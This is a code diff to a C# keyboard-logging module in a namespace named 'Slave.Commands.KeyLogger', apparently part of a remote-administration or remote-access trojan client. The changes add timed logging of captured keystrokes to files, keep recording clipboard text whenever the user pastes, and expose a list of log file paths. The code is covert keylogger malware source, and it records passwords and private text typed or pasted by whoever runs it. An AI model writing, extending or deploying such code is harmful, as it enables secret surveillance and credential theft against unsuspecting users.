@@ -1,4 +1,5 @@
-﻿using System.Windows.Forms;
+﻿using System.Collections.Generic;
+using System.Windows.Forms;
 
 namespace Slave.Commands.KeyLogger
 {
@@ -40,8 +41,8 @@ namespace Slave.Commands.KeyLogger
             // There is no need to start listening again
             if (keyboardHook.listening) return;
 
-            logger.ClearLogs();
-
+            // Start the logger timer
+            StartFileLogging();
             capsState = Control.IsKeyLocked(Keys.CapsLock);
             altGrState = false;
             ctrlState = false;
@@ -50,9 +51,13 @@ namespace Slave.Commands.KeyLogger
         }
 
         /// <summary>
-        /// Stop the hook from processing keys
+        /// Stop the hook from processing keys and stop the logger timer
         /// </summary>
-        public void StopListening() => keyboardHook.listening = false;
+        public void StopListening()
+        {
+            StopFileLogging();
+            keyboardHook.listening = false;
+        }
 
         /// <summary>
         /// When a key is pressed, process and log it
@@ -109,7 +114,7 @@ namespace Slave.Commands.KeyLogger
                 {
                     if (key == "V")
                     {
-                        logger.LogKey(" <Pasted>" + Clipboard.GetText() + "</Pasted> ");
+                        logger.LogKey("<Pasted>" + Clipboard.GetText() + "</Pasted>");
                     }
                 }
                 else if (key == "E" && altGrState)
@@ -124,7 +129,7 @@ namespace Slave.Commands.KeyLogger
             else
             {
                 // Undisplayable special chars
-                logger.LogKey(" <" + key + "> ");
+                logger.LogKey("<" + key + ">");
             }
         }
 
@@ -149,10 +154,11 @@ namespace Slave.Commands.KeyLogger
         }
 
         /// <summary>
-        /// Clear all events related to the keyboard hook, discard the hook
+        /// Clear all events related to the keyboard hook, discard the hook and stop the logger timer
         /// </summary>
         public void Stop()
         {
+            StopFileLogging();
             keyboardHook.KeyDown -= KeyboardHook_KeyDown;
             keyboardHook.KeyUp -= KeyboardHook_KeyUp;
             keyboardHook.Uninstall();
@@ -161,8 +167,12 @@ namespace Slave.Commands.KeyLogger
         /// <summary>
         /// Provides an access to the logger's GetLog() method outside of the namespace
         /// </summary>
-        /// <returns>Log's content</returns>
-        public string DumpLogs() => logger.GetLogs();
+        /// <returns>List of log files name</returns>
+        public List<string> GetLogFilesPath() => logger.GetLogFilesPath();
+        
+        public void StartFileLogging() => logger.StartLogTimer();
+
+        public void StopFileLogging() => logger.StopLogTimer();
 
         /// <summary>
         /// Returns the hook's listening status
